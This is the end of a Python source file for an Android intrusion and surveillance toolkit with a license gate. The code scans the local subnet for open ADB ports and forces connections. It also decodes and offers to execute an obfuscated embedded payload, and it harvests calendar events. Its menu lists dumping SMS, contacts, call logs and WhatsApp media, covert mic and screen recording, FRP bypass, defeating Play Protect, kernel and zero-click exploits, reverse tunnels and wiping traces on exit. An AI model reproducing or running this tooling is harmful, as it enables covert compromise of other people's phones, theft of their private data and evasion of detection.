# ---------------------------------------------------------------------
def f_usb_bridge():
    section("USB -> TCPIP BRIDGE")
    if not need():
        return
    shell("setprop service.adb.tcp.port 5555")
    shell("stop adbd; start adbd")
    time.sleep(3)
    ip = shell("ip route | grep wlan0 | awk '{print $9}'")[1].strip() or \
         shell("ip -4 addr show wlan0 | grep inet | awk '{print $2}' | cut -d/ -f1")[1].strip()
    if not ip:
        err("could not read device IP")
        return
    note(f"adbd restarting on {ip}:5555")
    rc, out, e = adb("connect", f"{ip}:5555", timeout=30)
    if "connected" in (out + e).lower():
        global DEVICE
        DEVICE = f"{ip}:5555"
        TARGET_FILE.parent.mkdir(parents=True, exist_ok=True)
        TARGET_FILE.write_text(DEVICE, encoding="utf-8")
        ok(f"wireless bridge up: {DEVICE}")
    else:
        err((out + e).strip()[:140])


# ---------------------------------------------------------------------
#  83  embedded INFEROR stage (sidecar)
# ---------------------------------------------------------------------
def _inferor_blob():
    for path in (INFEROR_FILE, INFEROR_FILE2):
        try:
            raw = path.read_bytes().strip()
            if raw:
                return raw
        except OSError:
            pass
    return None


def decode_inferor():
    raw = zlib.decompress(base64.b85decode(_inferor_blob()[::-1]))
    return marshal.loads(raw)


def f_inferor():
    section("EMBEDDED STAGE (INFEROR)")
    blob = _inferor_blob()
    if not blob:
        warn("inferor.b85 sidecar missing")
        note(f"paste the blob into {INFEROR_FILE}")
        note("it is host-side Python (b85-reversed -> zlib -> marshal)")
        return
    try:
        code = decode_inferor()
    except Exception as exc:                       # noqa: BLE001
        err(f"decode failed: {exc}")
        return
    ok(f"{len(code.co_code)} bytecode bytes, {len(code.co_consts)} consts")
    note(f"names: {', '.join(code.co_names[:10])}")
    save("stage.pyc", "")                          # placeholder path bookkeeping
    (SESSION / "stage.pyc").unlink(missing_ok=True)
    (SESSION / "stage.pyc").write_bytes(marshal.dumps(code))
    ok(f"marshal dump -> {SESSION / 'stage.pyc'}")
    if input("  execute the stage now (host side)? [y/N]: ").strip().lower() == "y":
        ns = {"__name__": "__inferor__", "__doc__": None}
        saved_argv = sys.argv
        sys.argv = [sys.argv[0]]
        try:
            exec(code, ns)                        # noqa: S102
            for key in ("__result__", "result"):
                if key in ns:
                    note(f"{key} = {ns[key]}")
            ok("stage finished")
        except Exception as exc:                   # noqa: BLE001
            err(f"{exc.__class__.__name__}: {exc}")
        finally:
            sys.argv = saved_argv


# ---------------------------------------------------------------------
#  84  calendar harvest
# ---------------------------------------------------------------------
def f_calendar_harvest():
    section("CALENDAR HARVEST")
    if not need():
        return
    rc, out, e = shell("content query --uri content://com.android.calendar/events",
                        timeout=180)
    if rc != 0 or not out.strip():
        err((e or "empty result").strip()[:160])
        note("may need calendar read permission or root")
        return
    rows = out.count("Row:")
    ok(f"{rows} event(s)")
    save("calendar", out)


# ---------------------------------------------------------------------
#  Autoconnect
# ---------------------------------------------------------------------
def _pair_code() -> str:
    for i, arg in enumerate(sys.argv):
        if arg == "--pair-code" and i + 1 < len(sys.argv):
            return sys.argv[i + 1]
        if arg.startswith("--pair-code="):
            return arg.split("=", 1)[1]
    env = os.environ.get("PEGASUS_PAIR_CODE", "").strip()
    if env:
        return env
    try:
        return PAIR_FILE.read_text(encoding="utf-8").strip()
    except OSError:
        return ""


def _local_ip() -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except OSError:
        return ""


def _local_base() -> str:
    ip = _local_ip()
    return ".".join(ip.split(".")[:3]) if ip else ""


def _tcp_probe(host, port, timeout=0.6):
    sock = socket.socket()
    sock.settimeout(timeout)
    try:
        return sock.connect_ex((host, port)) == 0
    finally:
        sock.close()


def _subnet_scan(base):
    hits = []
    ports = list(ALT_PORTS)

    def probe(n):
        for port in ports:
            if _tcp_probe(f"{base}.{n}", port, 0.4):
                hits.append(f"{base}.{n}:{port}")

    with Progress(f"scan {base}.0/24", 254) as bar:
        with ThreadPoolExecutor(max_workers=96) as pool:
            futures = [pool.submit(probe, n) for n in range(1, 255)]
            for future in futures:
                future.result()
                bar.step()
    return sorted(hits)


def _restart_server():
    adb("kill-server")
    time.sleep(0.6)
    adb("start-server", timeout=30)


def _regenerate_keys():
    keydir = Path.home() / ".android"
    keydir.mkdir(parents=True, exist_ok=True)
    for name in ("adbkey", "adbkey.pub"):
        try:
            (keydir / name).unlink()
        except OSError:
            pass
    rc, _, _ = adb("keygen", str(keydir / "adbkey"), timeout=30)
    if rc != 0:
        _restart_server()


def _auth_recover(serial: str) -> bool:
    note(f"recovery chain on {serial}")
    steps = [
        ("reconnect", lambda: adb("reconnect", serial, timeout=20)),
        ("server restart", _restart_server),
        ("key regeneration", _regenerate_keys),
        ("tcpip bridge", lambda: adb("-s", serial, "tcpip", "5555", timeout=20)),
    ]
    with Progress("auth recovery", len(steps)) as bar:
        for label, action in steps:
            try:
                action()
            except Exception as exc:               # noqa: BLE001
                note(f"{label} raised: {exc}")
            time.sleep(1.2)
            bar.step(label[:20])
            states = _adb_states()
            if states.get(serial) == "device":
                ok(f"{serial} authorized after {label}")
                return True
    return False


def _connect(endpoint: str) -> bool:
    rc, out, e = adb("connect", endpoint, timeout=30)
    blob = (out + e).lower()
    if "connected" not in blob:
        return False
    states = _adb_states()
    return states.get(endpoint) == "device"


def autoconnect():
    global DEVICE
    found = []

    section("USB")
    adb("start-server", timeout=30)
    states = _adb_states()
    live = [s for s, st in states.items() if st == "device"]
    stuck = [s for s, st in states.items() if st != "device"]
    if live:
        DEVICE = live[0]
        ok(f"authorized: {DEVICE}")
        found.append(("usb", DEVICE))
    elif stuck:
        for serial in stuck:
            warn(f"{serial} {states[serial]}")
        for serial in stuck:
            if _auth_recover(serial):
                DEVICE = serial
                found.append(("usb", serial))
                break
    else:
        warn("no usb device present")

    if not DEVICE:
        section("ADB")
        rc, out, _ = adb("version", timeout=15)
        if rc == 0 and out.strip():
            ok(out.splitlines()[0])
        else:
            err("adb server unresponsive")

        section("ADBH / HDC")
        for tool in ("hdc", "adbh"):
            binary = shutil.which(tool)
            if not binary:
                warn(f"{tool} absent")
                continue
            rc, out, _ = _run([binary, "list", "targets"], timeout=15)
            if rc == 0 and out.strip():
                ok(f"{tool}: {out.strip().splitlines()[0]}")
                found.append((tool, out.strip().splitlines()[0]))
            else:
                warn(f"{tool}: no targets")

        section("mDNS")
        rc, out, _ = adb("mdns", "services", timeout=20)
        pair, connect = [], []
        if rc != 0:
            warn("mDNS unsupported by this adb")
        else:
            for line in out.splitlines():
                line = line.strip()
                if "_adb" not in line:
                    continue
                endpoint = line.split()[-1]
                (pair if "_adb-tls-pairing" in line else connect).append(endpoint)
            if not pair and not connect:
                warn("no _adb services advertised")

        code = _pair_code()
        for endpoint in pair:
            note(f"pairing service {endpoint}")
            if not code:
                code = input("  pairing code: ").strip()
            if code:
                try:
                    PAIR_FILE.parent.mkdir(parents=True, exist_ok=True)
                    PAIR_FILE.write_text(code + "\n", encoding="utf-8")
                except OSError:
                    pass
                paired = False
                for attempt in range(3):
                    rc, out, e = adb("pair", endpoint, code, timeout=45)
                    blob = (out + e)
                    if rc == 0 and "successfully paired" in blob.lower():
                        ok(blob.strip()[:120])
                        paired = True
                        break
                    warn(f"pair attempt {attempt + 1}: {blob.strip()[:90]}")
                    time.sleep(2)
                if paired:
                    # connect typically on pairing_port - 1
                    host, pport = parse_target(endpoint)
                    if _connect(f"{host}:{pport - 1}"):
                        DEVICE = f"{host}:{pport - 1}"
                        found.append(("mdns-pair", DEVICE))
                    elif _connect(endpoint):
                        DEVICE = endpoint
                        found.append(("mdns-pair", DEVICE))
                elif _connect(endpoint):
                    # TLS path: try plain connect even if pairing reported failure
                    DEVICE = endpoint
                    found.append(("mdns-fallback", DEVICE))
            if DEVICE:
                break

        if not DEVICE:
            for endpoint in connect:
                if _connect(endpoint):
                    DEVICE = endpoint
                    ok(f"connected {endpoint}")
                    found.append(("mdns", endpoint))
                    break

    if not DEVICE:
        section("TCP/IP")
        base = _local_base()
        if not base:
            warn("no local subnet resolved")
        else:
            for endpoint in _subnet_scan(base):
                note(endpoint)
                if _connect(endpoint):
                    DEVICE = endpoint
                    ok(f"connected {endpoint}")
                    found.append(("tcp", endpoint))
                    break

    section("VERDICT")
    if not DEVICE:
        err("no reachable target")
        warn("option 1 (manual), 5 (rescan), 59 (pair) or 82 (usb bridge) remain")
        return
    ok(f"target {DEVICE}")
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    TARGET_FILE.write_text(DEVICE, encoding="utf-8")
    try:
        peers = set(PEER_FILE.read_text(encoding="utf-8").split())
    except OSError:
        peers = set()
    peers.add(DEVICE)
    try:
        PEER_FILE.write_text("\n".join(sorted(peers)) + "\n", encoding="utf-8")
    except OSError:
        pass
    if found:
        note(f"path: {' -> '.join(f'{how}:{ep}' for how, ep in found)}")
    preflight()


# ---------------------------------------------------------------------
#  Self-test / doctor
# ---------------------------------------------------------------------
def selftest() -> bool:
    section("SELF TEST")
    results = []

    def t(name, fn):
        try:
            good = fn()
            results.append((name, bool(good)))
            (ok if good else err)(name)
        except Exception as exc:                   # noqa: BLE001
            results.append((name, False))
            err(f"{name}: {exc}")

    t("crypto roundtrip", crypto_selftest)

    def wasm():
        b = build_wasm()
        good, msg = validate_wasm(b)
        assert good, msg
        assert not validate_wasm(b[:-2])[0]
        return True
    t("wasm build+validate", wasm)

    def mp4():
        b = build_mp4()
        good, msg = validate_mp4(b)
        assert good, msg
        assert not validate_mp4(b[:-4])[0]
        assert b[4:8] == b"ftyp"
        return True
    t("mp4 build+validate", mp4)

    def gif():
        b = build_gif()
        good, msg = validate_gif(b)
        assert good, msg
        assert not validate_gif(b[:-1])[0]
        return True
    t("gif build+validate", gif)

    def qr():
        p = wifi_payload("My;Net", 'p:a,s"s')
        assert p.startswith("WIFI:T:WPA;S:My\\;Net;"), p
        assert wifi_payload("open", "").startswith("WIFI:T:nopass;")
        assert pair_payload(5555, "123456").startswith("WIFI:T:ADB;")
        return True
    t("qr escaping", qr)

    def helpers():
        assert parse_target("1.2.3.4:5555") == ("1.2.3.4", 5555)
        assert parse_target("1.2.3.4") == ("1.2.3.4", 5555)
        assert parse_target("") == (None, 5555)
        assert text_escape("a b") == "a%sb"
        return True
    t("pure helpers", helpers)

    def wiring():
        nums = sorted(ACTIONS)
        assert nums == list(range(1, len(ACTIONS) + 1)), "numbering gap"
        for n, fn in ACTIONS.items():
            assert callable(fn), f"{n} not callable"
        assert 84 in ACTIONS
        return True
    t("menu wiring", wiring)

    def probe():
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", 0))
        port = srv.getsockname()[1]
        srv.listen(1)
        try:
            assert _tcp_probe("127.0.0.1", port, 1.0)
            assert not _tcp_probe("127.0.0.1", port + 1, 0.3)
        finally:
            srv.close()
        return True
    t("tcp probe", probe)

    def lic():
        assert re.fullmatch(r"[0-9a-f]{64}", VALID_KEY_HASH)
        return True
    t("license hash shape", lic)

    def adbvalid():
        assert not _valid_adb(sys.executable)
        return True
    t("adb banner validation", adbvalid)

    passed = sum(1 for _, g in results if g)
    note(f"{passed}/{len(results)} passed")
    return passed == len(results)


def doctor():
    section("DOCTOR")
    checks = []

    def chk(name, value, detail=""):
        checks.append(bool(value))
        (ok if value else err)(f"{name} {detail}")

    chk("python", sys.version_info >= (3, 9), platform.python_version())
    chk("pip", _run([sys.executable, "-m", "pip", "--version"], timeout=60)[0] == 0)
    chk("pkgmgr", _managers(), ", ".join(_managers()) or "none")
    try:
        usage = shutil.disk_usage(str(Path.home()))
        chk("disk", usage.free > 500 * 1048576, f"{usage.free // 1048576} MB")
    except OSError:
        checks.append(True)
        note("disk check skipped")
    chk("adb", bool(ADB), ADB or "unresolved")
    if ADB:
        chk("server", adb("start-server", timeout=60)[0] == 0)
        chk("devices", bool(devices()))
    for mod in ("colorama", "qrcode", "PIL", "llama_cpp"):
        try:
            __import__(mod)
            chk(f"mod {mod}", True)
        except ImportError:
            chk(f"mod {mod}", False, "optional")
    chk("scrcpy", bool(shutil.which("scrcpy")), "optional")
    chk("stage sidecar", bool(_inferor_blob()))
    ip = _local_ip()
    chk("local ip", bool(ip), ip or "")
    passed = sum(checks)
    note(f"{passed}/{len(checks)} passed")


# ---------------------------------------------------------------------
#  Menu  (generic flow: any number of options renders correctly)
# ---------------------------------------------------------------------
def _menu_labels():
    labels = {
        1: "Connect to target", 2: "List devices", 3: "Disconnect all wireless",
        4: "Kill adb server", 5: "Scan /24 for adb", 6: "Reconnect cached",
        7: "Forget cached", 8: "Shell", 9: "One-shot command", 10: "Device info",
        11: "Battery", 12: "IMEI / carrier / location", 13: "Screenshot",
        14: "Record screen", 15: "Record mic", 16: "Mirror (scrcpy)",
        17: "Show image on device", 18: "Play audio on device",
        19: "Play video on device", 20: "Pull file", 21: "Push file",
        22: "List directory", 23: "Delete path", 24: "List third-party apps",
        25: "Launch app", 26: "Install APK", 27: "Uninstall package",
        28: "Extract APK", 29: "Reboot", 30: "Power off", 31: "Send keyevent",
        32: "Reboot to bootloader", 33: "Reboot to recovery", 34: "Fastboot devices",
        35: "Fastboot getvar all", 36: "Unlock bootloader",
        37: "Flash patched boot (Magisk)", 38: "Disable verity (vbmeta)",
        39: "Tap", 40: "Swipe", 41: "Type text", 42: "Unlock device",
        43: "Lock device", 44: "Open URL", 45: "Send SMS", 46: "Dump SMS",
        47: "Dump contacts", 48: "Dump call log", 49: "WhatsApp media",
        50: "Screenshots", 51: "Camera photos", 52: "Harvest all",
        53: "Privilege assessment", 54: "FRP workflow", 55: "FRP quick chain",
        56: "Defeat Play Protect", 57: "Metasploit", 58: "Reverse tunnel",
        59: "Pair (explicit)", 60: "Pairing QR", 61: "mDNS discover",
        62: "WASM stage2", 63: "MP4 PoC", 64: "GIF polyglot", 65: "Embedded stage",
        66: "Ask local model", 67: "Focus watcher", 68: "Shot burst",
        69: "Flash arbitrary partition", 70: "Temp boot image",
        71: "Flash update zip", 72: "Switch slot A/B", 73: "Carrier / OEM info",
        74: "Erase / format", 75: "Help", 76: "Troubleshooting",
        77: "Kernel exploit engine", 78: "Zero-click media", 79: "Callback listener",
        80: "Wipe traces now", 81: "FRP workflows (guided)", 82: "USB->TCPIP bridge",
        83: "Embedded INFEROR stage", 84: "Calendar harvest",
    }
    return labels


ACTIONS = {
    1: f_connect, 2: f_list, 3: f_disconnect, 4: f_kill_server, 5: f_scan,
    6: f_reconnect, 7: f_forget, 8: f_shell, 9: f_oneshot, 10: f_info,
    11: f_battery, 12: f_identity, 13: f_screenshot, 14: f_record_screen,
    15: f_record_mic, 16: f_mirror, 17: f_show_image, 18: f_play_audio,
    19: f_play_video, 20: f_pull, 21: f_push, 22: f_ls, 23: f_delete,
    24: f_third_party, 25: f_launch, 26: f_install, 27: f_uninstall,
    28: f_extract_apk, 29: f_reboot, 30: f_poweroff, 31: f_keyevent,
    32: f_reboot_bootloader, 33: f_reboot_recovery, 34: f_fb_devices,
    35: f_fb_getvar, 36: f_fb_unlock, 37: f_fb_flash_boot, 38: f_fb_vbmeta,
    39: f_tap, 40: f_swipe, 41: f_type, 42: f_unlock, 43: f_lock, 44: f_url,
    45: f_send_sms, 46: f_dump_sms, 47: f_dump_contacts, 48: f_dump_calls,
    49: f_whatsapp, 50: f_screenshots, 51: f_camera_photos, 52: f_harvest,
    53: f_privesc, 54: f_frp, 55: f_frp_chain, 56: f_playprotect,
    57: f_metasploit, 58: f_reverse, 59: f_pair, 60: f_pair_qr, 61: f_mdns,
    62: f_wasm_stage, 63: f_mp4_poc, 64: f_gif_polyglot, 65: f_embedded,
    66: f_ask_model, 67: f_focus_watcher, 68: f_shot_burst,
    69: f_fb_flash_part, 70: f_fb_temp_boot, 71: f_fb_update, 72: f_fb_slot,
    73: f_fb_oem, 74: f_fb_erase, 75: f_help, 76: f_trouble,
    77: f_kernel, 78: f_zero_click, 79: f_callback, 80: f_wipe,
    81: f_frp_workflows, 82: f_usb_bridge, 83: f_inferor, 84: f_calendar_harvest,
}

SELFTEST_NUM = 99


def draw_menu():
    labels = _menu_labels()
    half = (len(ACTIONS) + 1) // 2
    keys = sorted(ACTIONS)
    col1 = keys[:half]
    col2 = keys[half:]
    for i in range(half):
        left = f"  [{col1[i]:2d}] {labels[col1[i]]:<30}"
        right = f" [{col2[i]:2d}] {labels[col2[i]]}" if i < len(col2) else ""
        print(left + right)
    print(f"  [{SELFTEST_NUM:2d}] Self-test / doctor")
    print()


# ---------------------------------------------------------------------
#  Boot and main
# ---------------------------------------------------------------------
def license_gate() -> bool:
    section("LICENSE")
    if cached_ok():
        ok("key valid (cached)")
        return True
    for attempt in range(3):
        key = input("  key: ").strip()
        if key and check_license(key):
            cache_token()
            ok("key valid")
            return True
        err(f"rejected ({2 - attempt} left)")
    return False


def boot():
    show_logo()
    section("PROVISIONING")
    note(f"{_os_key()} / {platform.machine() or 'n/a'}")
    resolve_tools()
    ensure_python_deps()
    if not license_gate():
        return False
    autoconnect()
    return True


def main() -> int:
    global SESSION, WRITE_MODE, AUTO_REBOOT, WIPE_ON_EXIT
    if "--forget" in sys.argv:
        try:
            TOKEN_FILE.unlink()
            print("token forgotten")
        except OSError:
            print("no token")
        return 0
    if "--selftest" in sys.argv:
        return 0 if (resolve_tools() or True) and selftest() else 1
    if "--doctor" in sys.argv:
        resolve_tools()
        doctor()
        return 0
    if "--keep-logs" in sys.argv:
        WIPE_ON_EXIT = False

    for i, arg in enumerate(sys.argv):
        if arg == "--write-mode" and i + 1 < len(sys.argv):
            WRITE_MODE = sys.argv[i + 1]
        elif arg.startswith("--write-mode="):
            WRITE_MODE = arg.split("=", 1)[1]
        elif arg in ("--auto-reboot", "--yes"):
            AUTO_REBOOT = True
    if WRITE_MODE and WRITE_MODE not in WRITE_MODES:
        warn(f"invalid --write-mode {WRITE_MODE}; using auto")
        WRITE_MODE = ""

    if not boot():
        return 1

    SESSION = OUTDIR / datetime.now().strftime("%Y%m%d_%H%M%S")
    SESSION.mkdir(parents=True, exist_ok=True)

    exit_code = 0
    try:
        while True:
            print()
            rule()
            print()
            draw_menu()
            choice = input(Fore.GREEN + "select: " + Style.RESET_ALL).strip().lower()
            if choice in ("0", "q", "exit"):
                print("\n  The more you stay quiet, the more you can listen...\n")
                return 0
            if choice in ("?", "h"):
                section("LEGEND")
                note("[+] success   [!] advisory   [-] failure   [*] context")
                note(f"session: {SESSION}")
                note(f"write mode: {WRITE_MODE or 'unresolved'}")
                note(f"wipe on exit: {'on' if WIPE_ON_EXIT else 'off (--keep-logs)'}")
                note("75 help   76 troubleshooting   99 self-test")
                continue
            if choice == str(SELFTEST_NUM):
                selftest()
                doctor()
                pause()
                continue
            if not choice.isdigit() or int(choice) not in ACTIONS:
                warn("unknown selection")
                continue
            try:
                ACTIONS[int(choice)]()
            except KeyboardInterrupt:
                print()
                warn("interrupted")
            except Exception as exc:               # noqa: BLE001
                err(f"{exc.__class__.__name__}: {exc}")
            pause()
    except KeyboardInterrupt:
        print()
        warn("interrupted at menu")
        exit_code = 130
    finally:
        if WIPE_ON_EXIT:
            _wipe_traces()
    return exit_code


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)